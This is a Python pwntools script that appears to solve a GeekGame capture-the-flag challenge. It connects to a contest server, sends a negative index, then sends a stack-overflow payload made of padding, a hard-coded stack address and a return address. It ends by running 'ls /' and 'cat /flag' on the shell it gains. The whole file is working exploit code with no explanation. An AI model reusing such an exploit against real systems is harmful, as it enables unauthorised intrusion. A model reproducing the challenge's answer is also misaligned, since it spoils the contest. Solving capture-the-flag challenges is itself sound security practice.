from pwn import *
import sys
import time
token = open("../tok", "r").read().strip()
print(token)
r = remote("prob12.geekgame.pku.edu.cn", 10012)
time.sleep(2)
r.sendline(token)
time.sleep(2)

def blockread():
    while True:
        _ = r.recvline(timeout=5)
        print(_)
        if _ == b"": break

r.sendline("1")
time.sleep(1)
r.sendline("1")
time.sleep(1)
r.sendline("4")
time.sleep(1)
r.sendline("abcd")
time.sleep(1)
r.sendline("1")
time.sleep(1)
r.sendline("1")
time.sleep(1)
r.sendline("-25")
time.sleep(1)
blockread()
payload = "a" * (0x200-0x34)
payload = payload.encode()
# payload += b"\x01\x00\x00\x00\x00\x00\x00\x00"
# 0x7fffffffd7c0
payload += b"\xc0\xd7\xff\xff\xff\x7f\x00\x00"
payload += b"\x34\x12\x40\x00\x00\x00\x00\x00"
payload += b"\x00\x00\x00\x00\x00\x00\x00\x00"
payload += b"\x00\x00\x00\x00\x00\x00\x00\x00"
payload += b"\x0a"
r.send(payload)
time.sleep(2)
blockread()
r.sendline("4")
time.sleep(1)
blockread()
        

r.sendline("ls /")
r.sendline("cat /flag")
print(r.recvall(10))
r.close()

